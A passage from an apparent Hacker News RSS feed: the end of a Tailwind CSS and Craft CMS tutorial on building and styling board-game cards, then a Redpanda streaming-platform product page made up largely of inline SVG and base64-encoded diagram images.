 "hot": "NODE_ENV=development node_modules/webpack-dev-server/bin/webpack-dev-server.js --inline --hot --config=node_modules/laravel-mix/setup/webpack.config.js",
 "prod": "npm run production",
 "production": "NODE_ENV=production node_modules/webpack/bin/webpack.js --no-progress --hide-modules --config=node_modules/laravel-mix/setup/webpack.config.js"
},
</code></pre>
</li>
<li><p>Build the CSS by running <code>lando npm run dev</code></p>
<pre><code>$ lando npm run dev
&gt; app@1.0.0 dev /app  
npm run development
&gt; app@1.0.0 development /app
&gt; NODE_ENV=development node_modules/webpack/bin/webpack.js --progress --hide-modules --config=node_modules/laravel-mix/setup/webpack.config.js
...
🛫 lots of stuff flying by 🛬
...
DONE  Compiled successfully in 11408ms          9:03:32 PM

       Asset      Size  Chunks             Chunk Names
web/css/app.css  2.31 MiB     mix  [emitted]  mix
</code></pre>
<p>Notice that our CSS file has been built at <span>web/css/app.css</span></p>
</li>
</ol>
<h2 id="update-homepage-to-display-styled-cards">Update Homepage to display styled cards <a href="#update-homepage-to-display-styled-cards" title="Update Homepage to display styled cards">#</a></h2>
<h3 id="replace-default-styling">Replace default styling <a href="#replace-default-styling" title="Replace default styling">#</a></h3>
<ol>
<li>Open <code>templates/index.twig</code>.</li>
<li><p>Between the last <code>&lt;meta&gt;</code> tag and before the <code>&lt;style&gt;</code> tag add:</p>
<pre><code> &lt;link rel="stylesheet" href="/css/app.css"&gt;
</code></pre>
</li>
<li><p>Remove all of the <code>&lt;style&gt;</code> section.</p>
</li>
<li><p>Replace the contents of the <code>&lt;body&gt;</code> tags with:</p>
<pre><code>  &lt;div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4"&gt;
 &lt;div class="grid grid-cols-4 gap-1 rounded bg-white text-black overflow-hidden border border-gray-400 bg-white rounded-b px-4 justify-between leading-normal"&gt;
   &lt;div class="col-span-2 pr-2"&gt;
  &lt;img class="w-full h-full object-cover" src="https://cdn.eaglepeakweb.com/img/projects/blog/Race-for-the-Galaxy.jpg" title="Race for the Galaxy"&gt;

   &lt;/div&gt;
   &lt;div class="col-span-2"&gt;
     &lt;p class="text-sm text-gray-600 flex items-center pt-4"&gt;
       &lt;span class="inline-block bg-red-200 text-red-800 rounded-full px-2 text-xs font-semibold tracking-wide"&gt;Strategy&lt;/span&gt;
     &lt;/p&gt;
     &lt;div class="text-gray-900 font-bold text-xl mb-2"&gt;Race for the Galaxy&lt;/div&gt;
     &lt;div class="flex items-center"&gt;
       &lt;svg class="fill-current text-gray-500 w-4 h-4" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24"&gt;
         &lt;path class="heroicon-ui" d="M9 12A5 5 0 1 1 9 2a5 5 0 0 1 0 10zm0-2a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm8 11a1 1 0 0 1-2 0v-2a3 3 0 0 0-3-3H7a3 3 0 0 0-3 3v2a1 1 0 0 1-2 0v-2a5 5 0 0 1 5-5h5a5 5 0 0 1 5 5v2zm5-10a1 1 0 0 1-1 1h-6a1 1 0 0 1 0-2h6a1 1 0 0 1 1 1z"/&gt;
       &lt;/svg&gt;
       &lt;span class="ml-2 mr-2 text-gray-700 text-sm"&gt;2&lt;/span&gt;

       &lt;svg class="fill-current text-gray-500 w-4 h-4 ml-2" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24"&gt;
         &lt;path class="heroicon-ui" d="M19 10h2a1 1 0 0 1 0 2h-2v2a1 1 0 0 1-2 0v-2h-2a1 1 0 0 1 0-2h2V8a1 1 0 0 1 2 0v2zM9 12A5 5 0 1 1 9 2a5 5 0 0 1 0 10zm0-2a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm8 11a1 1 0 0 1-2 0v-2a3 3 0 0 0-3-3H7a3 3 0 0 0-3 3v2a1 1 0 0 1-2 0v-2a5 5 0 0 1 5-5h5a5 5 0 0 1 5 5v2z"/&gt;
       &lt;/svg&gt;
       &lt;span class="ml-2 mr-2 text-gray-700 text-sm"&gt;4&lt;/span&gt;

       &lt;svg class="fill-current text-gray-500 w-3 w-4 h-4 ml-2" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24"&gt;
         &lt;path class="heroicon-ui" d="M9 12A5 5 0 1 1 9 2a5 5 0 0 1 0 10zm0-2a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm8 11a1 1 0 0 1-2 0v-2a3 3 0 0 0-3-3H7a3 3 0 0 0-3 3v2a1 1 0 0 1-2 0v-2a5 5 0 0 1 5-5h5a5 5 0 0 1 5 5v2zm-1.3-10.7l1.3 1.29 3.3-3.3a1 1 0 0 1 1.4 1.42l-4 4a1 1 0 0 1-1.4 0l-2-2a1 1 0 0 1 1.4-1.42z"/&gt;
       &lt;/svg&gt;
       &lt;span class="ml-2 mr-2 text-green-600 text-sm"&gt;2&lt;/span&gt;
     &lt;/div&gt;

     &lt;div class="flex items-center pt-8"&gt;
       &lt;svg class="fill-current text-gray-500 w-3 w-4 h-4" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24"&gt;
         &lt;path class="heroicon-ui" d="M12 22a10 10 0 1 1 0-20 10 10 0 0 1 0 20zm0-2a8 8 0 1 0 0-16 8 8 0 0 0 0 16zm1-8.41l2.54 2.53a1 1 0 0 1-1.42 1.42L11.3 12.7A1 1 0 0 1 11 12V8a1 1 0 0 1 2 0v3.59z"/&gt;
       &lt;/svg&gt;
       &lt;span class="ml-1 text-gray-700 leading-none text-sm"&gt;30-60 minutes&lt;/span&gt;
     &lt;/div&gt;

     &lt;div class="mt-2 flex items-center"&gt;
       &lt;svg class="fill-current text-gray-500 w-3 w-4 h-4" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24"&gt;
         &lt;path class="heroicon-ui" d="M20 22H4a2 2 0 0 1-2-2v-8c0-1.1.9-2 2-2h4V8c0-1.1.9-2 2-2h4V4c0-1.1.9-2 2-2h4a2 2 0 0 1 2 2v16a2 2 0 0 1-2 2zM14 8h-4v12h4V8zm-6 4H4v8h4v-8zm8-8v16h4V4h-4z"/&gt;
       &lt;/svg&gt;
       &lt;span class="ml-1 text-yellow-700 leading-none text-sm"&gt;Medium&lt;/span&gt;
     &lt;/div&gt;
     &lt;div class="mt-2 flex items-center"&gt;
       &lt;svg class="fill-current text-gray-500 w-3 w-4 h-4" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24"&gt;
         &lt;path class="heroicon-ui" d="M4.06 13a8 8 0 0 0 5.18 6.51A18.5 18.5 0 0 1 8.02 13H4.06zm0-2h3.96a18.5 18.5 0 0 1 1.22-6.51A8 8 0 0 0 4.06 11zm15.88 0a8 8 0 0 0-5.18-6.51A18.5 18.5 0 0 1 15.98 11h3.96zm0 2h-3.96a18.5 18.5 0 0 1-1.22 6.51A8 8 0 0 0 19.94 13zm-9.92 0c.16 3.95 1.23 7 1.98 7s1.82-3.05 1.98-7h-3.96zm0-2h3.96c-.16-3.95-1.23-7-1.98-7s-1.82 3.05-1.98 7zM12 22a10 10 0 1 1 0-20 10 10 0 0 1 0 20z"/&gt;
       &lt;/svg&gt;
       &lt;span class="ml-1 text-gray-700 leading-none text-sm"&gt;
         &lt;a …</code></pre></li></ol></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.eaglepeakweb.com/blog/style-board-game-cards-tailwind-css-craft-cms-tutorial">https://www.eaglepeakweb.com/blog/style-board-game-cards-tailwind-css-craft-cms-tutorial</a></em></p>]]>
            </description>
            <link>https://www.eaglepeakweb.com/blog/style-board-game-cards-tailwind-css-craft-cms-tutorial</link>
            <guid isPermaLink="false">hacker-news-small-sites-25084784</guid>
            <pubDate>Fri, 13 Nov 2020 17:26:32 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Redpanda – A Kafka compatible streaming platform for mission-critical workloads]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25084738">thread link</a>) | @xal
<br/>
November 13, 2020 | https://vectorized.io/redpanda/ | <a href="https://web.archive.org/web/*/https://vectorized.io/redpanda/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><p><h4>Engineered from the ground up for today’s hardware</h4></p><div><div><div><p><img src="data:image/svg+xml;base64,<svg width="509" height="214" viewBox="0 0 509 214" fill="none" xmlns="http://www.w3.org/2000/svg">
<path d="M222.4 125.3H228.5" stroke="#300500" stroke-width="4.5" stroke-miterlimit="10"/>
<path d="M146.1 136.7V116" stroke="#300500" stroke-width="7.6979" stroke-miterlimit="10"/>
<path d="M146.399 84.9V64.3" stroke="#300500" stroke-width="7.6979" stroke-miterlimit="10"/>
<path d="M160.5 91.1001L178 79.6001" stroke="#300500" stroke-width="7.6979" stroke-miterlimit="10"/>
<path d="M160.8 108.5L176.5 119.1" stroke="#300500" stroke-width="7.6979" stroke-miterlimit="10"/>
<path d="M146.1 38L137.3 41.2L132.7 49.3L134.3 58.5L141.4 64.5H150.8L157.9 58.5L159.5 49.3L154.9 41.2L146.1 38Z" stroke="#300500" stroke-width="7.6979" stroke-miterlimit="10"/>
<path d="M188.3 61.2L179.5 64.4L174.8 72.5L176.5 81.5999L183.6 87.5999H192.9L200.1 81.5999L201.7 72.5L197 64.4L188.3 61.2Z" stroke="#300500" stroke-width="7.6979" stroke-miterlimit="10"/>
<path d="M188.3 111L179.5 114.2L174.8 122.3L176.5 131.5L183.6 137.4H192.9L200.1 131.5L201.7 122.3L197 114.2L188.3 111Z" stroke="#300500" stroke-width="7.6979" stroke-miterlimit="10"/>
<path d="M146.3 134.7L137.6 137.9L132.9 145.9L134.5 155.1L141.7 161.1H151L158.1 155.1L159.8 145.9L155.1 137.9L146.3 134.7Z" stroke="#300500" stroke-width="7.6979" stroke-miterlimit="10"/>
<path d="M145.8 81.9L133.9 86.3L127.5 97.3L129.7 109.9L139.5 118.1H152.2L162 109.9L164.2 97.3L157.8 86.3L145.8 81.9Z" stroke="#300500" stroke-width="7.6979" stroke-miterlimit="10"/>
<path d="M208.9 177.1H125.2V183.3H208.9V177.1Z" fill="#DDDDDD"/>
<path d="M268.5 101.9L248 81.4V90.2H224.4V113.6H248V122.3L268.5 101.9Z" fill="#DDDDDD" stroke="#300500" stroke-width="4.5" stroke-miterlimit="10"/>
<path d="M265.3 175.9H222.7V181.3H265.3V175.9Z" fill="#DDDDDD"/>
<path fill-rule="evenodd" clip-rule="evenodd" d="M302.2 53.7L306.7 57.5999L326.6 62.0999H353L373.1 57.4L377.4 53.7L389.2 56L391.1 81.1999L397.5 88.0999L399.7 102.3L389.9 112L398.4 126.6L391 125L394.8 134.5L362.3 145.2L339.6 146.9L316.9 145.2L284.4 134.5L288.2 125L281 126.7L289.5 112.1L279.7 102.4L281.9 88.1999L288.3 81.3L290.2 56.0999C294.6 55.1999 297.2 54.7 302.2 53.7Z" fill="#300500" stroke="#300500" stroke-width="3" stroke-miterlimit="10"/>
<path fill-rule="evenodd" clip-rule="evenodd" d="M364.5 70.4999C392.4 37.1999 386.3 114.9 385.7 111L384.6 111.3L383.9 110.4C376.5 100.4 357 81.0999 364.5 70.4999Z" fill="#300500"/>
<path fill-rule="evenodd" clip-rule="evenodd" d="M314.9 70.4999C287 37.1999 293.1 114.9 293.7 111L294.8 111.3L295.5 110.4C303 100.4 322.4 81.0999 314.9 70.4999Z" fill="#300500"/>
<path fill-rule="evenodd" clip-rule="evenodd" d="M339.7 65.2999H353.3L364.4 72.0999L371.8 87.1999L375.6 83.1999L374.8 89.9999L381 91.6999L375.8 94.0999L392.2 122.5L386.1 121.1L390.9 133L361.8 142.6L339.7 144.2L317.6 142.6L288.5 133L293.3 121.1L287.2 122.5L303.6 94.0999L298.4 91.6999L304.7 89.9999L303.8 83.1999L307.6 87.1999L315 72.0999L326.2 65.2999H339.7Z" fill="#CC3805"/>
<path fill-rule="evenodd" clip-rule="evenodd" d="M352.9 119.9L361 116L364.3 102.1L372.8 125L361.8 142.6L339.7 144.2V115.5L352.9 119.9Z" fill="#780500"/>
<path fill-rule="evenodd" clip-rule="evenodd" d="M326.501 119.9L318.401 116L315.101 102.1L306.601 125L317.601 142.6L339.701 144.2V115.5L326.501 119.9Z" fill="#780500"/>
<path fill-rule="evenodd" clip-rule="evenodd" d="M370.2 83.8L371.8 87.2L375.6 83.2L374.8 90L381 91.7L375.8 94.1L392.2 122.5L386.1 121.1L390.9 133L377.6 137.4L386.4 130L370 83.9L370.2 83.8Z" fill="#ED6338"/>
<path fill-rule="evenodd" clip-rule="evenodd" d="M339.7 112.7L344.2 112.9L352.9 119.9H359.2L363.5 126.5L349.3 142.1L339.7 144.2L330.1 142.1L315.9 126.5L320.2 119.9H326.5L335.2 112.9L339.7 112.7Z" fill="#FFE8D6"/>
<path fill-rule="evenodd" clip-rule="evenodd" d="M339.7 140H347.4L352.3 129.5L359.3 131.2L349.3 142.1L339.7 144.2L330.1 142.1L321.8 132.9L327.9 131.5L332 140H339.7Z" fill="#F0BD94"/>
<path fill-rule="evenodd" clip-rule="evenodd" d="M345 103L342.9 90.7L351.9 88.2L352.8 99.9L345 103Z" fill="#F0BD94"/>
<path fill-rule="evenodd" clip-rule="evenodd" d="M359.2 93.8999L354.3 89.8999L354.9 99.5999L358.7 98.7999L359.2 93.8999Z" fill="#F0BD94"/>
<path fill-rule="evenodd" clip-rule="evenodd" d="M363.2 79.3L362.3 70.8L378.1 57.1L386.3 58.7L388.1 82.7L393.9 89L388.7 102.1L394.9 95.2L396.3 101.6L387.7 110.1L378.8 99.2L386 92.8L381.4 84.4L380.6 69.6L370 83.9L363.2 79.3Z" fill="#FFE8D6"/>
<path fill-rule="evenodd" clip-rule="evenodd" d="M380.6 69.6L370 83.9L363.3 79.3L369.7 80.4L380.6 69.6ZM387.7 110.1L378.8 99.2L386.1 92.7L381.4 84.3L380.6 69.5L383.3 84.3L388.6 90.3V102L387.7 110.1Z" fill="#F0BD94"/>
<path fill-rule="evenodd" clip-rule="evenodd" d="M362.3 70.7999L353.3 65.2999L374.3 60.3999L362.3 70.7999Z" fill="#780500"/>
<path fill-rule="evenodd" clip-rule="evenodd" d="M339.7 122.5L345.7 121.7L346.5 123.2L340.8 128.2L340.7 131.4L341.6 132.2L350.4 130.9L352.3 129.5L353.2 130.3L351.8 133.3L350.2 132.5L339.7 133.7H331L329.4 134.5L327.9 131.5L328.9 130.7L330.8 132.1L337.8 132.2L338.7 131.4V128.2L333 123.2L333.7 121.7L339.7 122.5Z" fill="#300500"/>
<path fill-rule="evenodd" clip-rule="evenodd" d="M339.7 122.7L345.7 121.7L341.9 113.3H339.7H337.5L333.7 121.7L339.7 122.7Z" fill="#F0BD94"/>
<path fill-rule="evenodd" clip-rule="evenodd" d="M353.2 116.6L358 113.9L360 108.3L353.3 104.7L348.2 107.7L346.7 114.4L353.2 116.6Z" fill="#300500"/>
<path fill-rule="evenodd" clip-rule="evenodd" d="M371.5 127.1L361.8 142.6L377.6 137.4L381.7 125.7L377.1 120.5L381.4 120.4L364.3 102.1L371.5 127.1Z" fill="#FFE8D6"/>
<path fill-rule="evenodd" clip-rule="evenodd" d="M339.7 112.7L344.2 112.9L342.5 104.8H339.7H336.9L335.2 112.9L339.7 112.7Z" fill="#ED6338"/>
<path fill-rule="evenodd" clip-rule="evenodd" d="M353.2 106.1L349 108.5L348.8 112.9L352.9 115.1L357.1 112.9L357.4 108.4L353.2 106.1Z" fill="#780500"/>
<path fill-rule="evenodd" clip-rule="evenodd" d="M353 107.2L350.2 108.7L350 111.7L352.8 113.1L355.5 111.7L355.7 108.7L353 107.2Z" fill="#300500"/>
<path fill-rule="evenodd" clip-rule="evenodd" d="M354.4 106.4L353 107.2V109L354.5 109.8L356.1 109L356.2 107.3L354.4 106.4Z" fill="#FFE8D6"/>
<path fill-rule="evenodd" clip-rule="evenodd" d="M339.7 65.2999V77.0999L351.6 65.2999H339.7Z" fill="#ED6338"/>
<path fill-rule="evenodd" clip-rule="evenodd" d="M361.8 142.6L365.4 136.8L374.6 132.7L378 125.9L377.1 120.5L381.7 125.7L377.6 137.4L361.8 142.6Z" fill="#F0BD94"/>
<path fill-rule="evenodd" clip-rule="evenodd" d="M351.9 88.2L342.9 90.7L344.7 101.4L348.7 99.2L351.9 88.2Z" fill="#FFE8D6"/>
<path fill-rule="evenodd" clip-rule="evenodd" d="M359.2 93.8999L354.3 89.8999L356.5 97.5999L359.2 93.8999Z" fill="#FFE8D6"/>
<path fill-rule="evenodd" clip-rule="evenodd" d="M309.2 83.8L307.6 87.2L303.8 83.2L304.7 90L298.4 91.7L303.6 94.1L287.2 122.5L293.3 121.1L288.5 133L301.8 137.4L293 130L309.5 83.9L309.2 83.8Z" fill="#ED6338"/>
<path fill-rule="evenodd" clip-rule="evenodd" d="M334.4 100.6L336.5 88.2999L327.5 85.7999L326.7 97.4999L334.4 100.6Z" fill="#F0BD94"/>
<path fill-rule="evenodd" clip-rule="evenodd" d="M320.2 92.6999L325.1 88.7999L324.5 98.3999L320.7 97.5999L320.2 92.6999Z" fill="#F0BD94"/>
<path fill-rule="evenodd" clip-rule="evenodd" d="M317.201 70.7999L326.201 65.2999L305.101 60.3999L317.201 70.7999Z" fill="#780500"/>
<path fill-rule="evenodd" clip-rule="evenodd" d="M326.2 116.6L321.4 113.9L319.4 108.3L326.1 104.7L331.2 107.7L332.8 114.4L326.2 116.6Z" fill="#300500"/>
<path fill-rule="evenodd" clip-rule="evenodd" d="M307.9 127.1L317.6 142.6L301.8 137.4L297.7 125.7L302.3 120.5L298 120.4L315.1 102.1L307.9 127.1Z" fill="#FFE8D6"/>
<path fill-rule="evenodd" clip-rule="evenodd" d="M326.2 106.1L330.4 108.5L330.7 112.9L326.5 115.1L322.3 112.9L322 108.4L326.2 106.1Z" fill="#780500"/>
<path fill-rule="evenodd" clip-rule="evenodd" d="M326.5 107.2L329.3 108.7L329.4 111.7L326.7 113.1L323.9 111.7L323.7 108.7L326.5 107.2Z" fill="#300500"/>
<path fill-rule="evenodd" clip-rule="evenodd" d="M325 106.4L326.4 107.2V109L324.9 109.8L323.3 109L323.2 107.3L325 106.4Z" fill="#FFE8D6"/>
<path fill-rule="evenodd" clip-rule="evenodd" d="M339.7 65.2999V77.0999L327.8 65.2999H339.7Z" fill="#ED6338"/>
<path fill-rule="evenodd" clip-rule="evenodd" d="M317.6 142.6L314 136.8L304.8 132.7L301.4 125.9L302.3 120.5L297.7 125.7L301.8 137.4L317.6 142.6Z" fill="#F0BD94"/>
<path fill-rule="evenodd" clip-rule="evenodd" d="M327.5 85.7999L336.5 88.2999L334.7 98.9999L330.7 96.8999L327.5 85.7999Z" fill="#FFE8D6"/>
<path fill-rule="evenodd" clip-rule="evenodd" d="M320.2 92.6999L325.1 88.7999L322.9 96.3999L320.2 92.6999Z" fill="#FFE8D6"/>
<path fill-rule="evenodd" clip-rule="evenodd" d="M316.201 79.3L317.201 70.8L301.301 57.1L293.101 58.7L291.401 82.7L285.501 89L290.701 102.1L284.501 95.2L283.101 101.6L291.701 110.1L300.601 99.2L293.401 92.8L298.001 84.4L298.801 69.6L309.501 83.9L316.201 79.3Z" fill="#FFE8D6"/>
<path fill-rule="evenodd" clip-rule="evenodd" d="M298.8 69.6L309.4 83.9L316.1 79.3L309.7 80.4L298.8 69.6ZM291.7 110.1L300.6 99.2L293.3 92.7L298 84.3L298.8 69.5L296.1 84.3L290.8 90.3V102L291.7 110.1Z" fill="#F0BD94"/>
<path fill-rule="evenodd" clip-rule="evenodd" d="M348.2 107.7L346.7 114.4L344.2 112.9L345.9 105.3L352.8 101.7L361.8 105.7L360 108.3L353.3 104.7L348.2 107.7Z" fill="#FFE8D6"/>
<path fill-rule="evenodd" clip-rule="evenodd" d="M331.2 107.7L332.8 114.4L335.2 112.9L333.5 105.3L326.6 101.7L317.7 105.7L319.4 108.3L326.1 104.7L331.2 107.7Z" fill="#FFE8D6"/>
<path d="M405.353 40.8149L404.08 39.5421L402.807 40.8149L404.08 42.0877L405.353 40.8149Z" stroke="#300500" stroke-width="4.5463" stroke-miterlimit="10"/>
<path d="M399.801 175.9H293.101V181.7H399.801V175.9Z" fill="#DDDDDD"/>
</svg>
" alt="undefined diagram"></p><div><h4>No Zookeeper® + Kafka® API compatible</h4><p>We eliminated Zookeeper® to streamline operations. Redpanda requires no code changes. Plug-and-play all your existing applications, connectors, and the entire ecosystem.</p></div></div></div><div><div><p><img src="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iNTA5IiBoZWlnaHQ9IjIxNCIgdmlld0JveD0iMCAwIDUwOSAyMTQiIGZpbGw9Im5vbmUiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyI+CjxwYXRoIGQ9Ik0yNjcuNTk5IDUwLjVIMjA2LjY5OVY3Ni4xSDI2Ny41OTlWNTAuNVoiIGZpbGw9IiNEREREREQiIHN0cm9rZT0iIzMwMDUwMCIgc3Ryb2tlLXdpZHRoPSI0LjUiIHN0cm9rZS1taXRlcmxpbWl0PSIxMCIvPgo8cGF0aCBkPSJNMjI1LjQ5OSA1OC4xMDAxTDIyMS45OTkgNTkuMzAwMUwyMjAuMTk5IDYyLjUwMDFMMjIwLjg5OSA2Ni4xMDAxTDIyMy41OTkgNjguNDAwMUgyMjcuMjk5TDIzMC4wOTkgNjYuMTAwMUwyMzAuNjk5IDYyLjUwMDFMMjI4Ljg5OSA1OS4zMDAxTDIyNS40OTkgNTguMTAwMVoiIGZpbGw9IiNEREREREQiIHN0cm9rZT0iIzMwMDUwMCIgc3Ryb2tlLXdpZHRoPSIzIiBzdHJva2UtbWl0ZXJsaW1pdD0iMTAiLz4KPHBhdGggZD0iTTI0OC4zIDU4LjEwMDFMMjQ0LjggNTkuMzAwMUwyNDMgNjIuNTAwMUwyNDMuNyA2Ni4xMDAxTDI0Ni40IDY4LjQwMDFIMjUwLjFMMjUyLjkgNjYuMTAwMUwyNTMuNSA2Mi41MDAxTDI1MS43IDU5LjMwMDFMMjQ4LjMgNTguMTAwMVoiIGZpbGw9IiNEREREREQiIHN0cm9rZT0iIzMwMDUwMCIgc3Ryb2tlLXdpZHRoPSIzIiBzdHJva2UtbWl0ZXJsaW1pdD0iMTAiLz4KPHBhdGggZD0iTTI2Ny41OTkgNzYuMTAwMUgyMDYuNjk5VjEwMS43SDI2Ny41OTlWNzYuMTAwMVoiIGZpbGw9IiNEREREREQiIHN0cm9rZT0iIzMwMDUwMCIgc3Ryb2tlLXdpZHRoPSI0LjUiIHN0cm9rZS1taXRlcmxpbWl0PSIxMCIvPgo8cGF0aCBkPSJNMjI1LjQ5OSA4My42MDAxTDIyMS45OTkgODQuOTAwMUwyMjAuMTk5IDg4LjAwMDFMMjIwLjg5OSA5MS42MDAxTDIyMy41OTkgOTQuMDAwMUgyMjcuMjk5TDIzMC4wOTkgOTEuNjAwMUwyMzAuNjk5IDg4LjAwMDFMMjI4Ljg5OSA4NC45MDAxTDIyNS40OTkgODMuNjAwMVoiIGZpbGw9IiNEREREREQiIHN0cm9rZT0iIzMwMDUwMCIgc3Ryb2tlLXdpZHRoPSIzIiBzdHJva2UtbWl0ZXJsaW1pdD0iMTAiLz4KPHBhdGggZD0iTTI0OC4zIDgzLjYwMDFMMjQ0LjggODQuOTAwMUwyNDMgODguMDAwMUwyNDMuNyA5MS42MDAxTDI0Ni40IDk0LjAwMDFIMjUwLjFMMjUyLjkgOTEuNjAwMUwyNTMuNSA4OC4wMDAxTDI1MS43IDg0LjkwMDFMMjQ4LjMgODMuNjAwMVoiIGZpbGw9IiNEREREREQiIHN0cm9rZT0iIzMwMDUwMCIgc3Ryb2tlLXdpZHRoPSIzIiBzdHJva2UtbWl0ZXJsaW1pdD0iMTAiLz4KPHBhdGggZD0iTTI2Ny41OTkgMTAxLjhIMjA2LjY5OVYxMjcuNEgyNjcuNTk5VjEwMS44WiIgZmlsbD0iI0RERERERCIgc3Ryb2tlPSIjMzAwNTAwIiBzdHJva2Utd2lkdGg9IjQuNSIgc3Ryb2tlLW1pdGVybGltaXQ9IjEwIi8+CjxwYXRoIGQ9Ik0yMjUuNDk5IDEwOS40TDIyMS45OTkgMTEwLjdMMjIwLjE5OSAxMTMuOEwyMjAuODk5IDExNy40TDIyMy41OTkgMTE5LjdIMjI3LjI5OUwyMzAuMDk5IDExNy40TDIzMC42OTkgMTEzLjhMMjI4Ljg5OSAxMTAuN0wyMjUuNDk5IDEwOS40WiIgZmlsbD0iI0RERERERCIgc3Ryb2tlPSIjMzAwNTAwIiBzdHJva2Utd2lkdGg9IjMiIHN0cm9rZS1taXRlcmxpbWl0PSIxMCIvPgo8cGF0aCBkPSJNMjQ4LjMgMTA5LjRMMjQ0LjggMTEwLjdMMjQzIDExMy44TDI0My43IDExNy40TDI0Ni40IDExOS43SDI1MC4xTDI1Mi45IDExNy40TDI1My41IDExMy44TDI1MS43IDExMC43TDI0OC4zIDEwOS40WiIgZmlsbD0iI0RERERERCIgc3Ryb2tlPSIjMzAwNTAwIiBzdHJva2Utd2lkdGg9IjMiIHN0cm9rZS1taXRlcmxpbWl0PSIxMCIvPgo8cGF0aCBkPSJNMzQyLjkgMTg2LjhIMTU3LjFWMTkzLjJIMzQyLjlWMTg2LjhaIiBmaWxsPSIjREREREREIi8+CjxwYXRoIGQ9Ik0zMTEuMDk5IDgyLjJMMzA1LjA5OSA3Ny41TDI5OS4xOTkgNzIuOEwzMDcuNzk5IDcwLjRMMzE2LjM5OSA2OEwzMTMuNjk5IDc1LjFMMzExLjA5OSA4Mi4yWiIgZmlsbD0iIzMwMDUwMCIvPgo8cGF0aCBkPSJNMzA4LjQ5OSA3NC4yTDI5OS4wOTkgNDYuOTAwMUwyNjAuNjk5IDIwLjhIMjEzLjM5OUwxNzUuMDk5IDQ2LjkwMDFMMTY1LjE5OSA3NSIgc3Ryb2tlPSIjMzAwNTAwIiBzdHJva2Utd2lkdGg9IjQuNSIgc3Ryb2tlLW1pdGVybGltaXQ9IjEwIi8+CjxwYXRoIGQ9Ik0xNjMuOTk5IDk3TDE2OS44OTkgMTAxLjdMMTc1Ljc5OSAxMDYuM0wxNjcuMTk5IDEwOC43TDE1OC42OTkgMTExLjFMMTYxLjI5OSAxMDRMMTYzLjk5OSA5N1oiIGZpbGw9IiMzMDA1MDAiLz4KPHBhdGggZD0iTTE2Ni40OTkgMTA1TDE3NS45OTkgMTMyLjNMMjE0LjI5OSAxNTguNEgyNjEuNjk5TDMwMi4yOTkgMTMwLjEiIHN0cm9rZT0iIzMwMDUwMCIgc3Ryb2tlLXdpZHRoPSI0LjUiIHN0cm9rZS1taXRlcmxpbWl0PSIxMCIvPgo8cGF0aCBkPSJNMjk2LjYgMTA5LjRMMzExLjQgMTU0LjFMMzIxLjEgMTQ1TDMzOC45IDE2Mi4yTDM0OS45IDE1MC44TDMzMi45IDEzNC4xTDM0MyAxMjMuOEwyOTYuNiAxMDkuNFoiIGZpbGw9IiNFRDYzMzgiIHN0cm9rZT0iIzMwMDUwMCIgc3Ryb2tlLXdpZHRoPSI0LjUiIHN0cm9rZS1taXRlcmxpbWl0PSIxMCIvPgo8cGF0aCBkPSJNMjkwLjM5OSAxMDEuOEwyODMuMzk5IDkzLjYwMDEiIHN0cm9rZT0iIzMwMDUwMCIgc3Ryb2tlLXdpZHRoPSI0LjUiIHN0cm9rZS1taXRlcmxpbWl0PSIxMCIvPgo8cGF0aCBkPSJNMjk5LjcgMTAzTDMwNCA5My4xMDAxIiBzdHJva2U9IiMzMDA1MDAiIHN0cm9rZS13aWR0aD0iNC41IiBzdHJva2UtbWl0ZXJsaW1pdD0iMTAiLz4KPHBhdGggZD0iTTI3OS4zIDExNC42TDI4OS45IDExMi4zIiBzdHJva2U9IiMzMDA1MDAiIHN0cm9rZS13aWR0aD0iNC41IiBzdHJva2UtbWl0ZXJsaW1pdD0iMTAiLz4KPC9zdmc+Cg==" alt="undefined diagram"></p><div><h4>Inline WASM tranforms</h4><p>Transform data inline with our embedded WASM engine. Whether you are guaranteeing GDPR compliance or simply enriching your data, eliminate the need to run additional systems for simple, inline lambda transforms.</p></div></div></div><div><div><p><img src="https://vectorized.io/static/do-more-with-less-9771bef9adcf700bfe86cfc721e047fe.svg" alt="undefined diagram"></p><div><h4>Do more with less</h4><p>Redpanda takes advantage of every core, memory, disk and network byte. Designed from the ground up in C++ to extract the most value from your  infrastructure.</p></div></div></div><div><div><p><img src="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iNTA5IiBoZWlnaHQ9IjIxNCIgdmlld0JveD0iMCAwIDUwOSAyMTQiIGZpbGw9Im5vbmUiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyI+CjxwYXRoIGQ9Ik0zNTguNSA3OS44TDM3MC4yIDc5LjIiIHN0cm9rZT0iIzMwMDUwMCIgc3Ryb2tlLXdpZHRoPSI0LjUiIHN0cm9rZS1taXRlcmxpbWl0PSIxMCIvPgo8cGF0aCBkPSJNMTM4LjQ2NiAxNjMuMTQ4TDEzNy4yNjQgMTYxLjk0NkwxMzYuMDYyIDE2My4xNDhMMTM3LjI2NCAxNjQuMzVMMTM4LjQ2NiAxNjMuMTQ4WiIgc3Ryb2tlPSIjMzAwNTAwIiBzdHJva2Utd2lkdGg9IjUuMTA4IiBzdHJva2UtbWl0ZXJsaW1pdD0iMTAiLz4KPHBhdGggZD0iTTI4NS44IDM3LjJIMTU0LjhWNzQuNTk5OUgyODUuOFYzNy4yWiIgZmlsbD0iI0RERERERCIgc3Ryb2tlPSIjMzAwNTAwIiBzdHJva2Utd2lkdGg9IjQuNSIgc3Ryb2tlLW1pdGVybGltaXQ9IjEwIi8+CjxwYXRoIGQ9Ik0xODAuNyA0OC4yTDE3NS43IDUwTDE3My